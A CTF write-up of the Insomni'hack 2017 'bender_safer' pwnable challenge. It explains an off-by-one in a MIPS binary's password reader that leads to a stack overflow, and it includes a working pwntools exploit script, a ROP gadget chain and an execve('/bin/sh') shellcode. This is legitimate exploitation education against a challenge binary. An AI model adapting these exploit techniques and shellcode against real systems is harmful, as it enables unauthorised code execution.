[Insomni'hack CTF 2017](https://teaser.insomnihack.ch) offered a serie of 3
challenges (i.e. 3 different flags) on the same binary, called `bender_safe`:

  * `bender_safe` was a Reversing challenge (50 pts) to [discover the correct
    validation sequence](https://advancedpersistentjest.com/2017/01/23/writeup-bender_safe-insomnihack-2017-teaser/);
  * `bender_safer` (this one) was a Pwnable challenge (300 pts), which could only be done once
    the first challenge was solved;
  * `bender_safest` was a Shellcoding challenge (150 pts), which could only be
    reached done when the two challenges above were solved. The goal was to
    write a MIPS shellcode to establish a connection to the local port tcp/31337.

Close to the end, only 19 teams (out of 400+) had solved this challenge. I
finished this challenge after the CTF, and since there was no write-up
available, I chose to write one.


### Info ###

The vulnerable file [`bender_safe`](/static/insomnihack_2017/bender_safe/bender_safe), is a
32-bit MIPS (Big-Endian) binary.

{% highlight bash %}
gef➤  !file ./bender_safe
./bender_safe: ELF 32-bit MSB executable, MIPS, MIPS-II version 1 (SYSV), statically linked, for GNU/Linux 2.6.32, BuildID[sha1]=76438e9ed749bcfc6e191e548da153d0d3b3ee28, not stripped
gef➤  checksec
[+] checksec for '/home/user/bender_safer/bender_safe'
Canary                        : No
NX Support                    : No
PIE Support                   : No
No RPATH                      : Yes
No RUNPATH                    : Yes
Partial RelRO                 : No
Full RelRO                    : No
{% endhighlight %}

No major protection, but I assumed ASLR active and therefore randomizing
the stack (only the stack, as the binary is not PIE).

In addition, some regions were RWX:
{% highlight bash %}
gef➤  vmmap
Start      End        Offset     Perm Path
0x00400000 0x00494000 0x00000000 r-x /home/user/bender_safer/bender_safe
0x004a3000 0x004a8000 0x00093000 rw- /home/user/bender_safer/bender_safe
0x004a8000 0x004cb000 0x00000000 rwx [heap]
0x7ffd6000 0x7fff7000 0x00000000 rwx [stack]
0x7fff7000 0x7fff8000 0x00000000 r-x [vdso]
{% endhighlight %}



### Vulnerability ###

The binary execution starts where the challenge `bender_safe` left off, with the
OTP validation. We then get into a simple menu offering 3 choices:


{% highlight text %}
This is Bender's password vault storage
I have 54043195528445952 bytes of memory for storage!
Although 54043195528444928 of which is used to store my fembots videos...HiHiHi!
Your passwords are safe with me meatbag!
-------------------------------
|                             |
|  1. View passwords          |
|  2. Enter new passwords     |
|  3. View admin password     |
|  4. Exit                    |
|                             |
-------------------------------
{% endhighlight %}

which we can immediately spot in IDA with the function `enter_vault`. IDA also
gives us a clear indication of the stack layout:

{% highlight bash %}
.text:004017E4 nb_password= -0x414
.text:004017E4 passwords= -0x410
.text:004017E4 choice= -0xC
.text:004017E4 sfp= -8
.text:004017E4 retaddr= -4
{% endhighlight %}

The `passwords` variable is a 1028 (0x410-0xC) byte array, which is used to
store the passwords. When trying to populate the array (choice #2), the function
`init_passwords` will be hit, and prompt the user for the number of passwords to
store, which must be an integer strictly below 513. `enter_vault` will
store the number of passwords to store in 2 locations, a dedicated variable
(@ebp-0x414), but also as the first value of the array `passwords`
(i.e. `passwords[0]`, @ebp-0x410). The number of passwords is used as a counter for a loop
that will read the passwords from stdin, thanks to the `read_passwords` function.

![](https://i.imgur.com/7UfE0bU.png)

After spending way too long spent trying to check for an arithmetic mistake, I
reviewed more thoroughly the function `read_passwords`.

The function `read_passwords` takes two arguments, a pointer to a buffer and a
integer, which corresponds to the size of data to read. The buffer is populated
one character at a time, in the following loop:

![](https://i.imgur.com/OYLowAm.png)

The interesting bit starts around 0x401640: when a `\n` character is provided to
fill the byte at offset `i` (i.e. `buffer[i]`), the function performs an additional
check to test if the preceding character (i.e. `buffer[i-1]`) was
`\r` and if so replace it with `\n`. And the vulnerability (as subtle as it is)
is here: when overwriting the byte, the function does not check that
`i>0`. Because we are on big endian architecture, this can lead to size
overwrite. To do so, we need to

   * Specify a number of passwords of `ord('\r')` (or 13);
   * The application will reply that we can store 13 passwords of 76 bytes;
   * Enter a first password with only `\n`

This will overwrite the number of passwords stored in `passwords[0]` to 10,
allowing us to write 12 passwords of 102 bytes (i.e. 1224 bytes), which results
in a stack overflow.

The vulnerability can  be asserted by setting a breakpoint before and after
the first call to `read_passwords`.


{% highlight bash %}
gef➤  b *0x004019BC

|  3. View admin password     |
|  4. Exit                    |
|                             |
-------------------------------

Enter your passwords, one per line

0x7fff62d8
gef➤  x/x 0x7fff62d8
0x7fff62d8:     0x0000000d   # << current size, before the call to read_passwords(
gef➤  advance *0x004019c4
                             # << enter an empty first password (only \n)
gef➤  x/x 0x7fff62d8
0x7fff62d8:     0x0000000a   # << new size, after the call
{% endhighlight %}

And if we populate the 12 remaining passwords with "A"*102 the return address
(`$ra` register) gets corrupted, which we can observe by taking the exit:

### Exploitation ###


#### Controlling $pc ####

So we are now able to make the program crash. To know the exact offset of `$pc`,
I've used the De Bruijn pattern from `gef` and `pwntools`.

{% highlight python %}
if __name__ == "__main__":
    HOST, PORT = "localhost", 12234
    r = remote(HOST, PORT)
    r.recvuntil("Here's your OTP challenge : \n")
    chal = r.readline().strip()
    resp = validate(chal)
    r.sendline(resp)
    r.recvuntil("-------------------------------\n")

    log.info("poisoing buf[-1] with \\r")
    r.sendline("2")
    r.recvuntil('How many passwords do you want to store? : ')
    l = 13 # \r
    r.sendline(str(l))
    r.recvline()
    r.recvline()
    r.send('\n') # this will force passwords[0] to be overwritten with 0xA, making the password size length wrong

    log.info("filling up the stack")
    raw_input("attach to gdb now...")
    pattern = cyclic(2000, n=4)
    for i in range(12):
        r.send(pattern[i*102:i*102+102])

    r.interactive()
{% endhighlight %}

And we now know that the PC is controlled at offset 921, as we are on a Big
Endian architecture:

#### ROP-ing to a fixed area ####


So great, we can control `$ra`, and therefore call any location. But the MIPS ABI
uses registers (from `$a0` to `$a3`) to store parameters of function
calls so we need to control (at least some of) them.

To achieve code execution, I decided to reach control only of `$a0` and `$a1`,
which is then sufficient to call `read_passwords(buffer, length)`, and have a
shellcode copied into one of the fixed RWX location.

After seeing too many ROP tools for MIPS fail, I simply used `objdump -D` to
find the following gadgets:

  * 0x00403ba4: Control `$s2` from a value given from the stack
{% highlight bash %}
.text:00403BA4 lw      $ra, 0x28+var_4($sp)
.text:00403BA8 lw      $s2, 0x28+var_8($sp)
.text:00403BAC lw      $s1, 0x28+var_C($sp)
.text:00403BB0 lw      $s0, 0x28+var_10($sp)
.text:00403BB4 jr      $ra
{% endhighlight %}

  * 0x403bbc: Use `$s2` to control `$v0`
{% highlight bash %}
.text:00403BBC lw      $ra, 0x28+var_4($sp)
.text:00403BC0 move    $v0, $s2
.text:00403BC4 lw      $s1, 0x28+var_C($sp)
.text:00403BC8 lw      $s2, 0x28+var_8($sp)
.text:00403BCC lw      $s0, 0x28+var_10($sp)
.text:00403BD0 jr      $ra
{% endhighlight %}

  * 0x00403b98: Use `$v0` to control `$a0`
{% highlight bash %}
.text:00403B98 move    $a0, $v0
.text:00403B9C bnez    $s0, loc_403B7C
.text:00403BA0 move    $a1, $zero
{% endhighlight %}

  * By re-using gadget@0x00403ba4 with 0x004038e8, we use `$s2` to control `$a1`
{% highlight bash %}
.text:004038E8 move    $a1, $s2
.text:004038EC lw      $ra, 0x30+var_4($sp)
.text:004038F0 lw      $s4, 0x30+var_8($sp)
.text:004038F4 lw      $s3, 0x30+var_C($sp)
.text:004038F8 lw      $s2, 0x30+var_10($sp)
.text:004038FC lw      $s1, 0x30+var_14($sp)
.text:00403900 lw      $s0, 0x30+var_18($sp)
.text:00403904 sltiu   $v0, 1
.text:00403908 jr      $ra
{% endhighlight %}

We can chain those 4 gadgets to entirely control `$a0` and `$a1` and then call
`read_passwords` to write a `execve('/bin/sh')` shellcode into one of fixed RWX pages (I've
chosen 0x004a8a00).


{% highlight python %}
log.info("preparing ropchain")
sfp = p32(0x004a8000)
set_s2 = p32(0x403BA4)
set_v0 = p32(0x403BBC)
set_a0 = p32(0x403B98)
set_a1 = p32(0x4038e8)
read_passwords = p32(0x004015E8)
a0 = p32(0x004a8a00)
a1 = p32(0x100)
p = 'YOLO'*2 + sfp
p+= set_s2 + 'YOLO'*8 + a0 + set_v0 + p32(0)*9 + set_a0 + "YOLO"*8 + 'ZZZ'
p+= set_s2 + 'YOLO'*8 + a1 + set_a1 + 'YOLO'*10 + 'Z'*3
p+= read_passwords + "YOLO"*9 + p32(0x4a8a00)
payload = p.ljust(303, "Z")
r.send(payload[:102])
r.send(payload[102:204])
r.send(payload[204:])
{% endhighlight %}


#### Shellcode crafting ####

For some reasons, the different shellcodes I had from external resources did not
work. So I decided to use [Keystone Engine](http://www.keystone-engine.org) to
write one. Instead of writing totally from scratch, I used a template created
earlier as part of my project
[`cemu`](https://github.com/hugsy/cemu/blob/master/templates/mipsbe_sys_exec_bin_sh.asm)
 and adapted it:

{% highlight python %}
log.info("preparing shellcode")
shellcode = [
  "li $sp, 0x4a8b00",
  "li $v0, 0x2f62696e",
  "sw $v0, 0($sp)",
  "li $v0, 0x2f736800",
  "sw $v0, 4($sp)",
  "li $v0, 4011",
  "move $a0, $sp",
  "addiu $a1, $zero, 0",
  "addiu $a2, $zero, 0",
  "syscall",
]

arch, mode, endian = keystone.KS_ARCH_MIPS, keystone.KS_MODE_MIPS32, keystone.KS_MODE_BIG_ENDIAN
ks = keystone.Ks(arch, mode | endian)
sc, cnt = ks.asm(shellcode)
log.info("keystone compiled %d instructions" % cnt)
sc = "".join([chr(x) for x in sc])
r.send(sc)
{% endhighlight %}

#### Fire ####

We have now all the components to launch our exploit. The final version is
available

### Conclusion ###

This is it... Well not really. The ultimate challenge was to craft a shellcode
to connect to tcp/31337. But the way we used to solve this challenge in the last
sections of this blog post makes it trivial to extend (by simply establishing a
TCP connection) and solve the final challenge. I
will leave this to the reader's curiosity  ☺

I will just conclude this post by thanking
the [Insomni'hack](https://insomnihack.ch) team for putting up together such fun
and original challenges. And also, huge congratz to the few teams who scored this
challenge during the CTF.

Hope you enjoyed this article, and see you next time for more challenges...
